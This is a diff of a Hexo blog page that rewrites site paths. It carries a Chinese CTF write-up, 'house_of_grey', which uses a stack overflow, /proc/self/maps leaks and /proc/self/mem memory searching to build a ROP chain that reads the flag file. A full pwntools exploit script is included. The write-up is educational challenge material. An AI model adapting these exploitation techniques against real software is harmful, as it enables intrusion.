@@ -5,50 +5,50 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制,发现保护全开   然后，我们用IDA分析一下   发现是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取">
 <meta property="og:type" content="article">
 <meta property="og:title" content="house_of_grey">
-<meta property="og:url" content="https://github.com/ha1vk/2019/12/09/house_of_grey/index.html">
+<meta property="og:url" content="https://github.com/2019/12/09/house_of_grey/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制,发现保护全开   然后，我们用IDA分析一下   发现是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image5.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image6.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image7.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image8.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image9.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image10.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image11.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image12.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image13.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image1.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image2.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image3.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image4.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image5.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image6.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image7.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image8.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image9.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image10.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image11.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image12.JPG">
+<meta property="og:image" content="https://github.com/2019/12/09/house_of_grey/image13.JPG">
 <meta property="article:published_time" content="2019-12-09T08:40:50.000Z">
 <meta property="article:modified_time" content="2025-06-21T10:45:21.364Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="栈溢出">
 <meta property="article:tag" content="内存搜索">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2019/12/09/house_of_grey/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2019/12/09/house_of_grey/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2019/12/09/house_of_grey/">
+<link rel="canonical" href="https://github.com/2019/12/09/house_of_grey/">
 
 
 <script id="page-configurations">
@@ -110,7 +110,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -131,27 +131,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -209,10 +209,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/12/09/house_of_grey/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2019/12/09/house_of_grey/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -247,7 +247,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -270,49 +270,49 @@
 
       
         <p>首先，检查一下程序的保护机制,发现保护全开</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image1.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image1.JPG" class="">
 
 <p>然后，我们用IDA分析一下</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image2.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image2.JPG" class="">
 
 <p>发现是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image3.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image3.JPG" class="">
 
 <p>程序有个缓冲区溢出漏洞</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image4.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image4.JPG" class="">
 
 <p>可以**[溢出，修改v8指针，然后我们就可以利用功能4，实现任意地址写]{.mark}**</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image5.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image5.JPG" class="">
 
 <p>由于可以读取除了flag之外的文件，那么我们可以<strong>读取&#x2F;proc&#x2F;self&#x2F;maps</strong>文件</p>
 <p>Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。<strong>&#x2F;proc&#x2F;self&#x2F;mem是进程的内存内容</strong>，<strong>通过修改该文件相当于直接修改当前进程的内存</strong>。该文件<strong>不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</strong></p>
 <p>同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。</p>
 <p>那么，我们先来测试一下</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image6.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image6.JPG" class="">
 
 <p>我们得到了各个段的地址，由此，我们可以绕过PIE，以及利用&#x2F;proc&#x2F;self&#x2F;mem来读取任意地址的内容。</p>
 <p>为了确定本程序能否getshell，我们检测一下execve系统调用有没有被禁用</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image7.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image7.JPG" class="">
 
 <p>发现<strong>execve被禁用，那么我们就不能用system这些来getshell，我们可以构造ROP，把flag文件读取到内存中，再输出来。</strong></p>
 <p>然后，我们再看看程序</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image8.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image8.JPG" class="">
 
 <p>程序最后有一个exit(0)，由此，<strong>覆盖fn函数的返回地址来构造ROP不可行</strong>，我们可以<strong>覆盖read函数的返回地址</strong>，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。<strong>为了覆盖read的返回地址，我们就需要确定栈的地址。</strong></p>
 <p>但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，<strong>我们不知道程序的栈地址。但是，我们可以通过读取&#x2F;proc&#x2F;self&#x2F;mem文件，来[搜索标记，已确定程序的栈地址。]{.mark}</strong></p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image9.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image9.JPG" class="">
 
-<img src="/ha1vk/2019/12/09/house_of_grey/image10.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image10.JPG" class="">
 
 <p>而**[标记就是”&#x2F;proc&#x2F;self&#x2F;maps”字符串，因为buf里保存了这个字符串，当我们在内存中搜索到这个字符串时，当前位置就是buf的栈地址，由此，我们就可以计算出其他的栈地址。]{.mark}**</p>
 <p>那么，我们先来获取一些需要的地址信息</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enterRoom()  </span><br><span class="line">setPath(<span class="string">&#x27;/proc/self/maps&#x27;</span>)  </span><br><span class="line">readSomething(<span class="number">2000</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You get something:\n&#x27;</span>)  </span><br><span class="line"><span class="comment">#解析程序的加载地址，以及mmap内存出的地址  </span></span><br><span class="line">elf_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br><span class="line">pop_rsi = elf_base + pop_s_rsi  </span><br><span class="line">open_addr = elf_base + open_s_plt  </span><br><span class="line">read_addr = elf_base + read_s_plt  </span><br><span class="line">puts_addr = elf_base + puts_s_plt  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">   line = sh.recvline()  </span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;heap&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">      <span class="comment">#接下来这一行就是mmap出的内存的信息  </span></span><br><span class="line">      line = sh.recvline()  </span><br><span class="line">      mmap_start = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">      mmap_end = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">      <span class="keyword">break</span>  </span><br></pre></td></tr></table></figure>
 
 <p>接下来，我们就需要读取&#x2F;proc&#x2F;self&#x2F;mem来搜索内存，确定栈地址了</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image11.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image11.JPG" class="">
 
 <p>程序只能执行30次功能调用，之前已经用了4次，最后我们还需要用2次，那么我们搜索就最多24次，</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image12.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image12.JPG" class="">
 
 <p>而我们每次最多允许读取100000个字节的数据，由此，我们能搜索2400000个字节的内容，通过IDA调试，观察buf的栈地址，计算它与mmap_end的值的差值，做一个大致的范围,由于<strong>栈是从高往低增长的，因此，我们应该从mmap_end – x ~ mmap_end搜索，其中x是一个范围。</strong></p>
 <p>那么，我们就开始搜索吧</p>
@@ -322,7 +322,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#覆盖v8指针内容为存放read返回地址的栈地址  </span></span><br><span class="line">payload = <span class="string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(read_ret)  </span><br><span class="line">setPath(payload)  </span><br><span class="line"><span class="comment">#接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  </span></span><br><span class="line">rop = p64(pop_rdi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_addr)  </span><br><span class="line"><span class="comment">#我们打开的文件，描述符为6  </span></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">6</span>) + p64(pop_rsi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(<span class="number">0</span>) + p64(read_addr)  </span><br><span class="line">rop += p64(pop_rdi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(puts_addr)  </span><br><span class="line">rop += <span class="string">&#x27;/home/ctf/flag\x00&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">giveSomething(rop)  </span><br></pre></td></tr></table></figure>
 
 <p>然后，我们就得到了flag</p>
-<img src="/ha1vk/2019/12/09/house_of_grey/image13.JPG" class="">
+<img src="/2019/12/09/house_of_grey/image13.JPG" class="">
 
 <p>综上，我们的exp脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwnh35&#x27;</span>)  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,37518)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnh35&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)  </span><br><span class="line">open_s_plt = elf.plt[<span class="string">&#x27;open&#x27;</span>]  </span><br><span class="line">read_s_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">puts_s_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#pop r15  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line">pop_s_rsi = <span class="number">0x1821</span>  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line">pop_s_rdi = <span class="number">0x1823</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enterRoom</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Do you want to help me build my room? Y/n?\n&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setPath</span>(<span class="params">content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;So man, what are you finding?\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seekTo</span>(<span class="params">pos</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;So, Where are you?\n&#x27;</span>,<span class="built_in">str</span>(pos))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readSomething</span>(<span class="params">length</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;How many things do you want to get?\n&#x27;</span>,<span class="built_in">str</span>(length))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">giveSomething</span>(<span class="params">content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line">enterRoom()  </span><br><span class="line">setPath(<span class="string">&#x27;/proc/self/maps&#x27;</span>)  </span><br><span class="line">readSomething(<span class="number">2000</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You get something:\n&#x27;</span>)  </span><br><span class="line"><span class="comment">#解析程序的加载地址，以及mmap内存出的地址  </span></span><br><span class="line">elf_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br><span class="line">pop_rsi = elf_base + pop_s_rsi  </span><br><span class="line">open_addr = elf_base + open_s_plt  </span><br><span class="line">read_addr = elf_base + read_s_plt  </span><br><span class="line">puts_addr = elf_base + puts_s_plt  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">   line = sh.recvline()  </span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;heap&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">      <span class="comment">#接下来这一行就是mmap出的内存的信息  </span></span><br><span class="line">      line = sh.recvline()  </span><br><span class="line">      mmap_start = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">      mmap_end = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#现在解析出clone的那个程序的stack地址  </span></span><br><span class="line">stack_end = mmap_end  </span><br><span class="line">stack_start = mmap_start  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#范围偏差  </span></span><br><span class="line">offset = <span class="number">0xf800000</span>  </span><br><span class="line"><span class="comment">#区间范围begin_off~stack_end里搜索  </span></span><br><span class="line">begin_off = stack_end - offset - <span class="number">24</span> * <span class="number">100000</span>  </span><br><span class="line">setPath(<span class="string">&#x27;/proc/self/mem&#x27;</span>)  </span><br><span class="line">seekTo(begin_off)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;begin-&gt;&#x27;</span>,<span class="built_in">hex</span>(begin_off),<span class="string">&#x27;to&#x27;</span>,<span class="built_in">hex</span>(stack_end)  </span><br><span class="line"><span class="comment">#在内存的范围内搜索，如果找到了/proc/self/mem这个字符串，说明当前地址就是buf的栈地址  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">24</span>):  </span><br><span class="line">   readSomething(<span class="number">100000</span>)  </span><br><span class="line">   content = sh.recvuntil(<span class="string">&#x27;1.Find &#x27;</span>)[:-<span class="number">7</span>]  </span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:  </span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;found!&#x27;</span>  </span><br><span class="line">      arr = content.split(<span class="string">&#x27;/proc/self/mem&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line"><span class="keyword">if</span> i == <span class="number">23</span>:  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;未能成功确定v8的地址，请重试!&#x27;</span>  </span><br><span class="line">   exit(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#获得了v8的地址，可以将它里面的内容，实现任意地址写  </span></span><br><span class="line">v8_addr = begin_off + i * <span class="number">100000</span> + <span class="built_in">len</span>(arr) + <span class="number">5</span>  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;v8 addr=&#x27;</span>,<span class="built_in">hex</span>(v8_addr)  </span><br><span class="line">read_ret = v8_addr - <span class="number">0x50</span>  </span><br><span class="line"><span class="comment">#覆盖v8指针内容为存放read返回地址的栈地址  </span></span><br><span class="line">payload = <span class="string">&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(read_ret)  </span><br><span class="line">setPath(payload)  </span><br><span class="line"><span class="comment">#接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  </span></span><br><span class="line">rop = p64(pop_rdi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_addr)  </span><br><span class="line"><span class="comment">#我们打开的文件，描述符为6  </span></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">6</span>) + p64(pop_rsi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(<span class="number">0</span>) + p64(read_addr)  </span><br><span class="line">rop += p64(pop_rdi) + p64(read_ret + <span class="number">15</span> * <span class="number">8</span>) + p64(puts_addr)  </span><br><span class="line">rop += <span class="string">&#x27;/home/ctf/flag\x00&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">giveSomething(rop)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
@@ -337,8 +337,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
-              <a href="/ha1vk/tags/%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2/" rel="tag"># 内存搜索</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2/" rel="tag"># 内存搜索</a>
           </div>
 
         
@@ -347,11 +347,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2019/12/09/swpuctf2019_login/" rel="prev" title="swpuctf2019_login(非栈上的格式化字符串利用)">
+    <a href="/2019/12/09/swpuctf2019_login/" rel="prev" title="swpuctf2019_login(非栈上的格式化字符串利用)">
       <i class="fa fa-chevron-left"></i> swpuctf2019_login(非栈上的格式化字符串利用)
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2019/12/12/calc2_calc/" rel="next" title="calc2">
+    <a href="/2019/12/12/calc2_calc/" rel="next" title="calc2">
       calc2 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -423,20 +423,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
